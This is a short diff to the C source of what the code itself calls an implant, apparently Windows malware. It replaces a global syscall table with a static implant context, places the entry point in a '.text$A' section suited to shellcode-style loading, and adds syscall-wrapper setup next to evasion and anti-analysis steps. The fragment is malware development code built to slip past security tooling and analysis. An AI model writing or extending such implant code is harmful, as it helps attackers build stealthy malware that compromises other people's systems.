@@ -18,8 +18,9 @@
 #include "antianalysis.h"
 #include "profile.h"
 
-/* External globals */
-extern SYSCALL_TABLE g_syscall_table;
+/* Implant context — file-scope static, no extern cross-TU references.
+   All subsystems receive a pointer to this via init functions. */
+static IMPLANT_CONTEXT g_ctx;
 
 /* Forward declarations for cleanup */
 static void implant_cleanup(void);
@@ -42,7 +43,7 @@ static void dev_init_exit(PVOID k32) {
 #define DEV_FAIL(code) return
 #endif
 
-__attribute__((section(".text.entry")))
+__attribute__((section(".text$A")))
 void implant_entry(PVOID param) {
     (void)param;
     NTSTATUS status;
@@ -67,7 +68,7 @@ void implant_entry(PVOID param) {
     (void)k32_base;
 
     /* ---- Step 3: Initialize the syscall engine ---- */
-    g_ctx.syscall_table = &g_syscall_table;
+    g_ctx.syscall_table = sc_get_table();
     status = sc_init(g_ctx.syscall_table);
     if (!NT_SUCCESS(status))
         DEV_FAIL(12);
@@ -86,6 +87,9 @@ void implant_entry(PVOID param) {
     /* Evasion init failure is non-fatal — syscalls still work via
        raw spec_syscall fallback in evasion_syscall() */
     (void)status;
+
+    /* ---- Step 3b.1: Initialize syscall wrappers with context ---- */
+    syscall_wrappers_init(&g_ctx);
 
     /* ---- Step 3c: Anti-analysis checks ---- */
     /* NOTE: Anti-analysis runs BEFORE config is loaded, so we cannot
